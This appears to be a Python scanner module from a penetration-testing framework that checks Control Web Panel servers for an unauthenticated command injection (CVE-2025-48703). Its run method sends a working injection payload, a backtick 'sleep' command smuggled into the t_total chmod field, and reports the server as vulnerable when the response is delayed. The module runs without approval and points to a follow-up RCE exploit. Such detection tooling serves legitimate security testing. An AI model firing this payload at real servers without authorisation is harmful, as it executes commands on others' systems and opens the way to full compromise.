#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CWP unauthenticated command injection in filemanager changePerm (CVE-2025-48703)."""

import random
import time
import urllib.parse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Control Web Panel - Command Injection Detection (CVE-2025-48703)',
        'description': (
            'CVE-2025-48703: unauthenticated POST to '
            '/<user>/index.php?module=filemanager&acc=changePerm with shell metacharacters '
            'in t_total (chmod argument) allows OS command execution when a valid non-root '
            'username is known.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'cwp', 'centos-webpanel', 'rce', 'kev', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.45,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/http/cwp_cve_2025_48703_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-48703',
            'https://fenrisk.com/research/rce-centos-web-panel/',
        ],
        'cve': 'CVE-2025-48703',
    }

    port = OptPort(2083, 'CWP user panel port', required=False)
    username = OptString('admin', 'Valid non-root CWP username to use in the URL path', required=False)

    def run(self):
        user = str(self.username or 'admin').strip('/')
        sleep_sec = random.randint(4, 6)
        path = f'/{user}/index.php?module=filemanager&acc=changePerm'
        body = urllib.parse.urlencode(
            {
                'fileName': '.bashrc',
                'currentPath': f'/home/{user}/',
                't_total': f'`sleep {sleep_sec}`',
            }
        )
        start = time.time()
        r = self.http_request(
            method='POST',
            path=path,
            data=body,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
            timeout=sleep_sec + 8,
        )
        elapsed = time.time() - start
        if elapsed >= sleep_sec and r is not None:
            self.set_info(
                severity='critical',
                reason=f'CVE-2025-48703: server delayed {elapsed:.1f}s on t_total injection',
                path=path,
            )
            return True
        return False
